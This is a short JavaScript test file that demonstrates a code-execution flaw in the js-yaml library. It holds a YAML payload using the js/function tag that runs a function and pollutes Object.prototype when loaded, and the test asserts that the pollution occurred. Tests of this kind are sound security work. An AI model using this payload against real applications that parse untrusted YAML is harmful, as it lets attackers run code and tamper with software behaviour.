// This is sanitized, which makes it hard to
// do anything 'real' with. You can do
// basic prototype pollution, though
test("Arbitrary code execution in js-yaml", () => {
  expect.assertions(2);
  const payload =
    "{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1";
  const jsyaml = require("js-yaml");
  expect({}.polluted).toBe(undefined);
  try {
    jsyaml.load(payload);
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
